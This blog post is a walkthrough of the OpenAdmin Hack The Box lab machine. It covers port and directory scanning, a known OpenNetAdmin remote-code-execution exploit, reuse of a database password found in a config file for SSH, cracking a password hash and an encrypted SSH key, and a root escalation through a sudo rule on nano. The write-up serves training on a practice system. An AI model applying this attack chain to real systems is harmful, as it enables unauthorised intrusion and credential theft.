---
layout: single
title: OpenAdmin - Hack The Box
excerpt: "OpenAdmin is an easy box that starts with using an exploit for the OpenNetAdmin software to get initial RCE. Then we get credentials from the database config and can re-use them to connect by SSH. We then find another web application with an hardcoded SHA512 hash in the PHP code for the login page. After cracking it we're able to log in and obtain an encrypted SSH key that we have to crack. After getting one more shell, we can run nano as root with sudo and spawn a shell as root."
date: 2020-05-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-openadmin/openadmin_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - opennetadmin
  - unintended
  - db creds
  - gtfobins
---

![](/assets/images/htb-writeup-openadmin/openadmin_logo.png)

OpenAdmin is an easy box that starts with using an exploit for the OpenNetAdmin software to get initial RCE. Then we get credentials from the database config and can re-use them to connect by SSH. We then find another web application with an hardcoded SHA512 hash in the PHP code for the login page. After cracking it we're able to log in and obtain an encrypted SSH key that we have to crack. After getting one more shell, we can run nano as root with sudo and spawn a shell as root.

## Summary

- Find the OpenNetAdmin page and use a remote code execution exploit to get access to user www-data
- The DB credentials from the OpenNetAdmin configuration file are re-used for SSH access as user jimmy
- Find another internal website running and get a SHA512 hash from the PHP code
- After cracking the hash, log into the application and find an encrypted SSH private key
- Crack the key and then log in a user joanna and get the first flag
- Look at the sudo commands and find that nano can be run as root, look up gtfobins and spawn /bin/bash from nano

```
root@kali:~/htb/openadmin# nmap -p- 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 14:41 EST
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```

## Web enumeration

The default Ubuntu page is shown when I check out the webserver's root directory.

![](/assets/images/htb-writeup-openadmin/web1.png)

Let's run gobuster to find hidden files and directories:

```
# gobuster dir -t 50 -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x php -u http://openadmin.htb
[...]
/artwork (Status: 301)
/music (Status: 301)
/server-status (Status: 403)
/sierra (Status: 301)
```

So I found a couple of static web pages for the three directories above:

![](/assets/images/htb-writeup-openadmin/web2.png)

![](/assets/images/htb-writeup-openadmin/web3.png)

![](/assets/images/htb-writeup-openadmin/web4.png)

## OpenNetAdmin RCE

The `/music` page's login link goes to `http://openadmin.htb/ona/` which is running OpenNetAdmin, a system for tracking IP network attributes in a database.

![](/assets/images/htb-writeup-openadmin/ona.png)

I see it's running `v18.1.1` and a quick search on exploit-db shows I can get RCE by exploiting a bug in the application.

```
OpenNetAdmin 18.1.1 - Remote Code Execution     | exploits/php/webapps/47691.sh
```

After executing the exploit I have RCE as user `www-data`.

```
root@kali:~/htb/openadmin# ./exploit.sh http://openadmin.htb/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Unintended path to root flag

While looking around the filesystem I found a hash in `priv.save` which turned out to be the root flag.
```
$ ls -l /opt
total 12
drwxr-x--- 7 www-data www-data 4096 Nov 21 18:23 ona
-rw-r--r-- 1 root     root        0 Nov 22 23:49 priv
-rw-r--r-- 1 root     root       33 Jan  2 20:54 priv.save
-rw-r--r-- 1 root     root       33 Jan  2 21:12 priv.save.1
$ cat /opt/priv.save
2f907ed450b[...]
```

## Escalating to user jimmy

I see there's two additonal users which I don't have access to right now.

```
$ ls -l /home
total 8
drwxr-x--- 5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
drwxr-x--- 6 joanna joanna 4096 Nov 28 09:37 joanna

$ lslogins
  UID USER            PROC PWD-LOCK PWD-DENY  LAST-LOGIN GECOS
[...]
 1000 jimmy              0                   Jan02/20:50 jimmy
 1001 joanna             0                   Jan02/21:12 ,,,
```

The OpenNetAdmin database credentials are shown in the `/database_settings.inc.php` file.

```
$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

The `n1nj4W4rri0R!` password works with user `jimmy` to get an SSH shell:

```
root@kali:~/htb/openadmin# ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 

jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

## Escalating to user joanna

Looking at the Apache2 configuration, I see there's an internal website running on port 52846.

```
$ ls -l /etc/apache2/sites-available/*
-rw-r--r-- 1 root root 6338 Jul 16 18:14 /etc/apache2/sites-available/default-ssl.conf
-rw-r--r-- 1 root root  303 Nov 23 17:13 /etc/apache2/sites-available/internal.conf
-rw-r--r-- 1 root root 1329 Nov 22 14:24 /etc/apache2/sites-available/openadmin.conf

$ cat /etc/apache2/sites-available/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

The `index.php` file contains the username and SHA512 hash of the password.

```php
<h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div>
```

The user is using a common password so the hash has already been cracked and I can do a search online and find the password: `Revealed`

![](/assets/images/htb-writeup-openadmin/password.png)

I'll reconnect my SSH session with port-forwarding so I can access the local site: `ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846`

![](/assets/images/htb-writeup-openadmin/internal1.png)

![](/assets/images/htb-writeup-openadmin/internal2.png)

The internal site contains the SSH private key for the joanna user. It's encrypted but I can crack it easily with john the ripper:

![](/assets/images/htb-writeup-openadmin/cracked.png)

```
root@kali:~/htb/openadmin# ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa': 
[...]
joanna@openadmin:~$ cat user.txt
c9b2cf07d[...]
```

## Root priv esc

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

`nano` is running as root, this is our way in. Looking at [GTFObins](https://gtfobins.github.io/gtfobins/nano/), I see an easy way to get a shell as root:

![](/assets/images/htb-writeup-openadmin/gtfo.png)

I'll use the first method to gain a root shell.

![](/assets/images/htb-writeup-openadmin/root.png)